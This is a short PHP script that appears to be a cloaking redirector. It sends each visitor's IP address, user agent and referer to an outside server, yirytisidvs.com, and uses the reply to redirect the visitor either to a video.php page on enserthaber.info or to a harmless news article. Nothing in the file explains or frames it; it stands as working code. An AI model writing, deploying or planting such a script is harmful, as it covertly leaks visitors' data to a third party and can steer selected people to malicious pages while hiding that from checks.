<?php
  $session_id = session_id();
  if (!$session_id) {
   session_start();
  }
  
    $server_output = 0;
  if (!isset($_SESSION['server_output'])) {
   if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
     $ipNo = $_SERVER['HTTP_CLIENT_IP'];
   } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
     $ipNo = $_SERVER['HTTP_X_FORWARDED_FOR'];
   } else {
     $ipNo = $_SERVER['REMOTE_ADDR'];
   }
   
   $headerUserAgent = $_SERVER['HTTP_USER_AGENT'];
   $referer = $_SERVER['HTTP_REFERER'];
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL,"http://yirytisidvs.com/checkSiteControlCurl.php");
   curl_setopt($ch, CURLOPT_POST, 1);
   curl_setopt($ch, CURLOPT_POSTFIELDS,"queryString=Z4dlP6Jt7d  &ipNumber=".$ipNo."&header=".$headerUserAgent."&referer=".$referer);
   // receive server response ...
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   $server_output = curl_exec ($ch);
   curl_close ($ch);
  } 
  
  
  if (!isset($_SESSION['server_output'])) {
   $_SESSION['server_output'] = $server_output; 
  }
  
if($_SESSION['server_output'] == 1) {
    header('Location: http://enserthaber.info/Qrrww/video.php');

} else {
    header('Location: http://www.mynet.com/haber/foto-analiz/mardindeki-mezarlikta-bulundu-tunel-oyle-bir-yere-cikiyor-ki-3165301-1');
}
?>
